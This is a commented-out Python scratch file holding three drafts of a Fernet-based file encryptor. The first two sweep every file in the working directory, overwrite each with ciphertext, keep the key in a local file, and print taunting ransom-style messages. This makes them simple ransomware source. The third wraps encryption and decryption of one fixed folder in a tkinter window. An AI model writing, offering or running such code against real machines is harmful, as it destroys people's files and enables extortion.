# import os 

# from cryptography.fernet import Fernet

# files = []

# for file in os.listdir():
#    if file == "test.py" or file == "thekey.key" or file == "testd.py":
#       continue
#    if os.path.isfile(file):
#       files.append(file)

# print(files) 


# key = Fernet.generate_key()


# with open("thekey.key" , "wb") as thekey:
#    thekey.write(key)


# for file in files:
#    with open(file , "rb") as thefile:
#       contents = thefile.read()
#    contents_encrypted = Fernet(key).encrypt(contents)
#    with open(file , "wb") as thefile:
#       thefile.write(contents_encrypted)


# print("thanks to your data HHhhHhH")





































































# import os

# from  cryptography.fernet import Fernet


# files = []

# for file in os.listdir():
#    if file == "test.py" or file == "thekey.key" or file  =="testd.py":
#       continue
#    if os.path.isfile(file):
#       files.append(file)


# print(files)


# key = Fernet.generate_key()

# with open("thekey.key" , "wb") as thekey:
#    thekey.write(key)



#    for file in files:
#       with open(file , "rb") as thefile:
#          contents = thefile.read()
#       contents_encrypted = Fernet(key).encrypt(contents)
#       with open(file ,"wb") as thefile:
#          thefile.write(contents_encrypted)


# print("thanks for 100m")         





# import tkinter as tk
# from tkinter import messagebox
# import os
# from cryptography.fernet import Fernet

# def encrypt_files():
#     # Specify the folder path
#     folder_path = r'C:\test\picture'

#     # Initialize a list to store file names
#     files = []

#     # List files in the specified folder
#     for file in os.listdir(folder_path):
#         if file == "test.py" or file == "thekey.key" or file == "testd.py":
#             continue
#         if os.path.isfile(os.path.join(folder_path, file)):
#             files.append(file)

#     # Generate a Fernet encryption key
#     key = Fernet.generate_key()

#     # Write the encryption key to a file
#     key_path = os.path.join(os.path.dirname(__file__), "thekey.key")
#     with open(key_path, "wb") as thekey:
#         thekey.write(key)

#     # Encrypt the files in the specified folder
#     for file in files:
#         file_path = os.path.join(folder_path, file)
#         with open(file_path, "rb") as thefile:
#             contents = thefile.read()
#         contents_encrypted = Fernet(key).encrypt(contents)
#         with open(file_path, "wb") as thefile:
#             thefile.write(contents_encrypted)

#     messagebox.showinfo("Encryption Complete", "Files encrypted successfully!")

# def decrypt_files():
#     # Specify the folder path
#     folder_path = r'C:\test\picture'

#     # Read the encryption key from a file
#     key_path = os.path.join(os.path.dirname(__file__), "thekey.key")
#     with open(key_path, "rb") as thekey:
#         key = thekey.read()

#     # Decrypt the files in the specified folder
#     for file in os.listdir(folder_path):
#         if os.path.isfile(os.path.join(folder_path, file)):
#             file_path = os.path.join(folder_path, file)
#             with open(file_path, "rb") as thefile:
#                 contents_encrypted = thefile.read()
#             contents_decrypted = Fernet(key).decrypt(contents_encrypted)
#             with open(file_path, "wb") as thefile:
#                 thefile.write(contents_decrypted)

#     messagebox.showinfo("Decryption Complete", "Files decrypted successfully!")

# # Create the main application window
# app = tk.Tk()
# app.title("File Encryption/Decryption Tool")

# # Create buttons for encryption and decryption
# encrypt_button = tk.Button(app, text="Encrypt Files", command=encrypt_files)
# decrypt_button = tk.Button(app, text="Decrypt Files", command=decrypt_files)
# encrypt_button.pack(pady=20)
# decrypt_button.pack()

# # Run the main event loop
# app.mainloop()
